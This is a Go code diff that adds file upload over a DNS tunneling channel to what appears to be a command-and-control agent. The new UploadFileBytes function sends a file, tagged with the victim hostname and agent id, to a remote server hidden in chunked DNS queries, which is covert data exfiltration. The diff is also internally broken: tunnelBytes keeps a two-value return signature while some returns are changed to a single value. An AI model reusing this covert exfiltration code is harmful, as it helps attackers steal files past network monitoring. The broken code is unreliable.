@@ -33,6 +33,8 @@ const (
 	PAYLOAD_REQUEST_TYPE = "pr"
 	PAYLOAD_FILENAME_DOWNLOAD_TYPE = "pf"
 	PAYLOAD_DATA_DOWNLOAD_TYPE = "pd"
+	UPLOAD_REQUEST_TYPE = "ur"
+	UPLOAD_DATA_TYPE = "ud"
 )
 
 type DnsTunneling struct {
@@ -164,7 +166,36 @@ func (d* DnsTunneling) SendExecutionResults(profile map[string]interface{}, resu
 }
 
 func (d* DnsTunneling) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
-	return errors.New("Not yet implemented.")
+	paw := profile["paw"]
+	server := profile["server"].(string)
+	hostname := profile["host"].(string)
+	if len(server) == 0 {
+		return errors.New("No server specified in profile for file upload.")
+	}
+	if len(hostname) == 0 {
+		return errors.New("No hostname specified in profile for file upload.")
+	}
+	if len(uploadName) > 0 && paw != nil {
+		uploadMetadata := map[string]string{
+			"file": uploadName,
+			"paw": paw.(string),
+			"directory": fmt.Sprintf("%s-%s", hostname, paw.(string)),
+		}
+		metadata, err := json.Marshal(uploadMetadata)
+		if err != nil {
+			return err
+		}
+
+		// Let server know we want to upload a file.
+		messageID := generateRandomMessageID()
+		if err = d.tunnelBytesToServer(server, messageID, UPLOAD_REQUEST_TYPE, metadata); err != nil {
+			return err
+		}
+
+		// Send upload data, using same message ID as before.
+		return d.tunnelBytesToServer(server, messageID, UPLOAD_DATA_TYPE, data)
+	}
+	return errors.New("File upload request missing paw and/or file name.")
 }
 
 func (d* DnsTunneling) GetName() string {
@@ -203,14 +234,14 @@ func (d* DnsTunneling) tunnelBytes(dataType string, data []byte) (string, error)
 		chunk := data[start:end]
 		qname, err := generateQname(messageID, dataType, i, numChunks, chunk)
 		if err != nil {
-			return "", err
+			return err
 		}
 		if err = d.sendDataChunk(qname, finalChunk); err != nil {
 			return "", err
 		}
 		start += MAX_UPLOAD_CHUNK_SIZE
 	}
-	return messageID, nil
+	return nil
 }
 
 // If data chunk is the final chunk and server does not respond with completion, returns error.
